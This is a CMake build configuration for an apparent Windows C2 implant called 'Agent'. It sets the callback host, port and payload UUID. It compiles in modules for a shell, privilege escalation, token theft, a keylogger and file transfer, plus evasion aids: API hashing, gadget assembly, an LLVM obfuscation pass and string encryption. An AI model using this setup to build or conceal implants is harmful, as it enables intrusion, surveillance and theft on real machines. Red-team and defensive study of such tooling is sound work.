# CMakeList.txt : CMake project for Agent, include source and define
# project specific logic here.
#
cmake_minimum_required (VERSION 3.10)

# Enable Hot Reload for MSVC compilers if supported.
if (POLICY CMP0141)
  cmake_policy(SET CMP0141 NEW)
  set(CMAKE_MSVC_DEBUG_INFORMATION_FORMAT "$<IF:$<AND:$<C_COMPILER_ID:MSVC>,$<CXX_COMPILER_ID:MSVC>>,$<$<CONFIG:Debug,RelWithDebInfo>:EditAndContinue>,$<$<CONFIG:Debug,RelWithDebInfo>:ProgramDatabase>>")
endif()

project (Agent)

# Host unit checks are registered with CTest (spec 12.1.4.1).
enable_testing()

# clangd and the `tidy` target read the compile database; Agent/doc/DEV.md documents it as always
# generated, so enable it explicitly here (it was never set, which left tidy unable to run).
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# Hosts List Configuration
set(INPUT_HOSTS "localhost" CACHE STRING "List of target host addresses")
string(STRIP "${INPUT_HOSTS}" INPUT_HOSTS)
# Extract first host using string operations
string(FIND "${INPUT_HOSTS}" ";" SEMI_POS)
if(SEMI_POS GREATER -1)
    string(SUBSTRING "${INPUT_HOSTS}" 0 ${SEMI_POS} FIRST_HOST)
else()
    set(FIRST_HOST "${INPUT_HOSTS}")
endif()
# Pass as a quoted string to the compiler
set(WIDE_HOSTS_LIST "\"${FIRST_HOST}\"")

# Payload UUID Configuration
set(INPUT_PAYLOAD_UUID "0c71632c-217f-46ce-bb81-dbfd32dd18ac" CACHE STRING "The payload unique identifier")

# Port Configuration
set(PORT 5069 CACHE STRING "The port to connect to")
string(STRIP "${PORT}" CLEAN_PORT)

# User Agent Configuration
set(INPUT_USER_AGENT "Trinity Agent Client/1.0" CACHE STRING "The user agent for requests")

# Agent Header Configuration
set(INPUT_REQUEST_HEADER "Content-Type: application/json" CACHE STRING "The agent request header")

# Add source to this project's executable.
add_executable (
  Agent 
  "src/main.cpp"
  "src/agent.cpp"
  "src/transport/comm_manager.cpp"
  "src/commands/command_dispatcher.cpp"
  "src/commands/exec/shell.cpp"
  "src/commands/exec/scheduling.cpp"
  "src/commands/exec/run_program.cpp"
  "src/commands/exec/privesc.cpp"
  "src/commands/exec/runu.cpp"
  "src/commands/exec/kill_process.cpp"
  "src/commands/exec/token.cpp"
  "src/commands/exec/keylogger.cpp"
  "src/commands/exec/filetransfer.cpp"
  "src/commands/exec/wintask.cpp"
  "src/commands/exec/netasm.cpp"
  "src/commands/exec/getuid.cpp"
  "src/commands/exec/exit.cpp"
  "src/host/host_info.cpp"
  "src/task/task_queue_manager.cpp"
  "src/task/task_validator.cpp"
  "src/util/strings.cpp"
  "src/util/process.cpp"
  "src/util/trace.cpp"
  "external/base64.hpp"
  "external/api_hashing/ApiHashing.c"
  "external/api_hashing/StringHashing.c"
  "external/api_hashing/ReadThroughGadgets.c"
)

# Assembly source for read-through gadgets (MASM for MSVC, GAS for MinGW).
if(MSVC)
    target_sources(Agent PRIVATE "external/api_hashing/ReadGadgets.asm")
else()
    # The MinGW toolchain does not enable the ASM language, so we assemble
    # the GAS source with a custom command and link the resulting object.
    set (GAS_OBJECT "${CMAKE_BINARY_DIR}/read_gadgets_gas.s.obj")
    add_custom_command (
      OUTPUT "${GAS_OBJECT}"
      COMMAND x86_64-w64-mingw32-as -o "${GAS_OBJECT}"
              "${CMAKE_CURRENT_SOURCE_DIR}/src/util/read_gadgets_gas.s"
      DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/src/util/read_gadgets_gas.s"
      COMMENT "Assembling read_gadgets_gas.s"
      VERBATIM
    )
    target_sources(Agent PRIVATE "${GAS_OBJECT}")
endif()

# `external` is vendored third-party code; mark it SYSTEM so
# clang-tidy / the static analyzer don't report diagnostics on it.
target_include_directories(Agent SYSTEM PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/external)
target_include_directories(Agent PUBLIC ${CMAKE_CURRENT_SOURCE_DIR}/include)
target_include_directories(Agent PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/include/agent)

# Optional LLVM New-PM pass plugin (obfuscation).
# Off by default and only valid with a Clang toolchain, so existing GCC/MinGW builds are
# unaffected. Point it at a compatible plugin (.so) built against the same LLVM version:
#   cmake -S Agent -B out/build/mingw-clang-x86_64 --preset mingw-clang-x86_64 \
#         -DAGENT_PASS_PLUGIN=/path/to/libObfuscator.so
# See Agent/doc/DEV.md ("Obfuscation") for the LLVM-version constraint and attributions.
set(AGENT_PASS_PLUGIN "" CACHE FILEPATH "LLVM New-PM pass plugin to load while compiling (optional)")
if(AGENT_PASS_PLUGIN)
    if(NOT CMAKE_CXX_COMPILER_ID MATCHES "Clang")
        message(FATAL_ERROR "AGENT_PASS_PLUGIN requires a Clang toolchain (e.g. the mingw-clang-x86_64 preset).")
    endif()
    target_compile_options(Agent PRIVATE "-fpass-plugin=${AGENT_PASS_PLUGIN}")
    message(STATUS "Agent: loading LLVM pass plugin: ${AGENT_PASS_PLUGIN}")
endif()

# xorstr uses AVX2 intrinsics on x86_64 by default; force the SSE2 path so the
# payload runs on any x86_64 host (SSE2 is guaranteed on all x86_64 CPUs).
target_compile_definitions(Agent PRIVATE JM_XORSTR_DISABLE_AVX_INTRINSICS)

# --- Debugging aids (never part of a payload CMakePayloadBuilder assembles) ---
# AGENT_TRACE compiles the structured trace logger (src/util/trace.cpp) into the payload: one
# timestamped, flushed line per event in %TEMP%\agent-<pid>.log, plus GetLastError/WinHTTP status
# on failure. Off by default so a shipped payload carries neither the code nor its strings; the
# `*-debug` presets enable it. See .pi/notes/live-debugging.md.
option(AGENT_TRACE "Compile the structured trace logger into the payload" OFF)
if(AGENT_TRACE)
    if(NOT WIN32)
        message(FATAL_ERROR "AGENT_TRACE needs a Windows target (use a mingw or MSVC preset).")
    endif()
    target_compile_definitions(Agent PRIVATE AGENT_TRACE)
    message(STATUS "Agent: AGENT_TRACE enabled (trace file: %TEMP%\\agent-<pid>.log)")
endif()

# AgentSupervisor is a separate tiny executable that waits for a payload and logs its exit code
# (0xC0000005 vs 0xC000013A vs 1). Built only on request: the payload builder ships exactly
# <build>/Agent.exe, and a helper target should never be a candidate for that.
option(AGENT_SUPERVISOR "Build the AgentSupervisor exit-code helper" OFF)
if(AGENT_SUPERVISOR)
    if(NOT WIN32)
        message(FATAL_ERROR "AGENT_SUPERVISOR needs a Windows target (use a mingw or MSVC preset).")
    endif()
    add_executable(AgentSupervisor "tools/supervisor/supervisor.cpp")
    set_property(TARGET AgentSupervisor PROPERTY CXX_STANDARD 20)
    # The Clang toolchain's debug flags ask LLD for `<binary>.pdb` for every executable, which
    # would let a supervisor relink overwrite Agent.pdb (stale symbols = wrong stacks). Give this
    # target its own PDB.
    if(CMAKE_CXX_COMPILER_ID MATCHES "Clang")
        set_property(TARGET AgentSupervisor APPEND_STRING PROPERTY
            LINK_FLAGS " -Wl,--pdb=${CMAKE_CURRENT_BINARY_DIR}/AgentSupervisor.pdb")
    endif()
    message(STATUS "Agent: AgentSupervisor enabled")
endif()

# --- Code formatting & static analysis targets -------------------------------
# Usage:
#   cmake --build build/Agent --target format   # format all sources in place
#   cmake --build build/Agent --target tidy     # run clang-tidy (needs a configured build)
file(GLOB_RECURSE AGENT_FORMAT_SOURCES
    ${CMAKE_CURRENT_SOURCE_DIR}/src/*.cpp
    ${CMAKE_CURRENT_SOURCE_DIR}/include/*.h
    ${CMAKE_CURRENT_SOURCE_DIR}/include/*.hpp
    ${CMAKE_CURRENT_SOURCE_DIR}/external/*.hpp)

# base64.hpp and xorstr.hpp are vendored third-party code; exclude them from
# formatting and tidy (they must stay byte-for-byte upstream).
list(FILTER AGENT_FORMAT_SOURCES EXCLUDE REGEX "base64\\.hpp")
list(FILTER AGENT_FORMAT_SOURCES EXCLUDE REGEX "xorstr\\.hpp")

find_program(CLANG_FORMAT clang-format)
if(CLANG_FORMAT)
    add_custom_target(format
        COMMAND ${CLANG_FORMAT} -i ${AGENT_FORMAT_SOURCES}
        COMMENT "Running clang-format on Agent sources"
        VERBATIM)
endif()

find_program(CLANG_TIDY clang-tidy)
if(CLANG_TIDY)
    # Only pass .cpp files — headers are analyzed as part of their including
    # translation units. Passing .h files directly causes clang to default
    # to the C language for them.
    file(GLOB AGENT_TIDY_SOURCES ${CMAKE_CURRENT_SOURCE_DIR}/src/*.cpp)
    # For cross-compilation, clang-tidy (clang frontend) needs explicit paths
    # to the target's C++ standard library headers.
    set(TIDY_EXTRA_ARGS "")
    if(NOT MSVC)
        set(MINGW_PREFIX "/usr/x86_64-w64-mingw32")
        set(TIDY_EXTRA_ARGS
            "--extra-arg=-isystem${MINGW_PREFIX}/include/c++/16.2.0"
            "--extra-arg=-isystem${MINGW_PREFIX}/include/c++/16.2.0/x86_64-w64-mingw32"
            "--extra-arg=-isystem${MINGW_PREFIX}/include/c++/16.2.0/backward"
        )
    endif()
    add_custom_target(tidy
        COMMAND ${CLANG_TIDY} -p ${CMAKE_BINARY_DIR} ${TIDY_EXTRA_ARGS} ${AGENT_TIDY_SOURCES}
        COMMENT "Running clang-tidy on Agent sources"
        VERBATIM)
endif()

find_program(PYTHON3 python3)
if(PYTHON3)
    add_custom_target(check-xorstr
        COMMAND ${PYTHON3} ${CMAKE_CURRENT_SOURCE_DIR}/xorstr.py
        COMMENT "Running xorstr compliance checker"
        VERBATIM)
endif()

# Host-side unit checks. The task command validator is platform-neutral, so it is compiled with
# the build host's compiler and executed here rather than on the (cross-compiled) Windows target:
#   cmake --build <build-dir> --target check-units
find_program(HOST_CXX NAMES g++ clang++)
if(HOST_CXX)
    set(HOST_TEST_FLAGS
        -std=gnu++20 -O1 -Wall -Wextra -Werror
        -DJM_XORSTR_DISABLE_AVX_INTRINSICS
        -I ${CMAKE_CURRENT_SOURCE_DIR}/include
        -I ${CMAKE_CURRENT_SOURCE_DIR}/include/agent
        -isystem ${CMAKE_CURRENT_SOURCE_DIR}/external)

    # Multi-config generators (Ninja Multi-Config, VS) otherwise place these under <config>/, and
    # `ctest` from the build root then reports "Not Run" for both. Pin them to the build root so one
    # path is right for every generator; this is host-compiled test code, not payload output.
    set(HOST_TEST_DIR "${CMAKE_BINARY_DIR}")

    add_custom_command(
        OUTPUT ${HOST_TEST_DIR}/task_validator_test
        COMMAND ${HOST_CXX} ${HOST_TEST_FLAGS}
                ${CMAKE_CURRENT_SOURCE_DIR}/tests/task_validator_test.cpp
                ${CMAKE_CURRENT_SOURCE_DIR}/src/task/task_validator.cpp
                -o ${HOST_TEST_DIR}/task_validator_test
        DEPENDS ${CMAKE_CURRENT_SOURCE_DIR}/tests/task_validator_test.cpp
                ${CMAKE_CURRENT_SOURCE_DIR}/src/task/task_validator.cpp
                ${CMAKE_CURRENT_SOURCE_DIR}/include/agent/task/task_validator.h
        COMMENT "Compiling the host task-validator checks"
        VERBATIM)

    add_custom_command(
        OUTPUT ${HOST_TEST_DIR}/task_parsing_test
        COMMAND ${HOST_CXX} ${HOST_TEST_FLAGS}
                ${CMAKE_CURRENT_SOURCE_DIR}/tests/task_parsing_test.cpp
                ${CMAKE_CURRENT_SOURCE_DIR}/src/task/task_queue_manager.cpp
                -o ${HOST_TEST_DIR}/task_parsing_test
        DEPENDS ${CMAKE_CURRENT_SOURCE_DIR}/tests/task_parsing_test.cpp
                ${CMAKE_CURRENT_SOURCE_DIR}/src/task/task_queue_manager.cpp
                ${CMAKE_CURRENT_SOURCE_DIR}/include/agent/task/task_queue_manager.h
        COMMENT "Compiling the host task-parsing checks"
        VERBATIM)

    add_custom_target(check-units
        COMMAND ${HOST_TEST_DIR}/task_validator_test
        COMMAND ${CMAKE_BINARY_DIR}/task_parsing_test
        DEPENDS ${CMAKE_BINARY_DIR}/task_validator_test ${CMAKE_BINARY_DIR}/task_parsing_test
        COMMENT "Running host unit checks"
        VERBATIM)

    # ctest does not build: run the check-units target first, then `ctest` in the build directory.
    add_test(NAME task_validator COMMAND ${HOST_TEST_DIR}/task_validator_test)
    add_test(NAME task_parsing COMMAND ${HOST_TEST_DIR}/task_parsing_test)
endif()

target_compile_definitions(Agent PRIVATE COMM_HOSTS_LIST=${WIDE_HOSTS_LIST})
target_compile_definitions(Agent PRIVATE COMM_PAYLOAD_UUID="${INPUT_PAYLOAD_UUID}")
target_compile_definitions(Agent PRIVATE COMM_USER_AGENT="${INPUT_USER_AGENT}")
target_compile_definitions(Agent PRIVATE COMM_PORT=${CLEAN_PORT})
target_compile_definitions(Agent PRIVATE COMM_REQUEST_HEADER="${INPUT_REQUEST_HEADER}")

if (CMAKE_VERSION VERSION_GREATER 3.12)
  set_property(TARGET Agent PROPERTY CXX_STANDARD 20)
endif()

# TODO: Add tests and install targets if needed.
